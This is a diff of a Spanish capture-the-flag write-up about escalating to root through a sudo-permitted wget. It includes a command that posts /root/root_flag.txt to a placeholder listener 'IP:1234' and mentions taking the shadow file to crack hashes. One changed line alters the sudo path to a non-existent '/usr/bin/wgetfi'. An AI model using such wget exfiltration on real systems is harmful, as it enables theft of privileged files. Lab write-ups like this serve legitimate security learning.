@@ -33,7 +33,7 @@ Entramos como jessie y podemos leer la flag del user, veamos como escalar
 ```
 User jessie may run the following commands on CorpOne:
     (ALL : ALL) ALL
-    (root) NOPASSWD: /usr/bin/wget
+    (root) NOPASSWD: /usr/bin/wgetfi
 ```
 Sin password solo wget , por suerte es bien conocido que con wget tenemos arbitrary file read/write
 
@@ -45,3 +45,8 @@ Obtenemos el shadow y intentamos crackear el hash, aunque la way que se busca po
  sudo /usr/bin/wget --post-file=/root/root_flag.txt IP:1234
 ```
  
+# Analisís de la intrusión
+### Sensible data leak
+La clave SSH de el usuario jessie esta expuesta en el servidor por una mala congiguracion
+### Privileged wget execution
+La ejecución privilegiada de wger permite exfiltrar archivos de manera arbitraria si se consigue acceso a el usuario
